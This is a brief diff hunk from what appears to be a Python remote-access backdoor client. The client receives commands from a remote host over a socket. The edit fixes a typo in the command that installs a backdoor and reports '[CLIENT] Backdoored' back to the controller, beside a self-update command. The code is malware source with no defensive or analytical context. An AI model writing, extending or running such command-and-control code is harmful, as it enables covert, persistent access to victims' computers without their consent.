@@ -523,7 +523,7 @@ def main(host, port):
                     elif (commands[0] == "selfupdateall"):
                         selfUpdate()
                         return None
-                    elif (commands[0] == "serbackdoor"):
+                    elif (commands[0] == "setbackdoor"):
                         try:
                             debackdoor(commands[1])
                             s.send(bytes("[CLIENT] Backdoored\n", 'utf-8'))
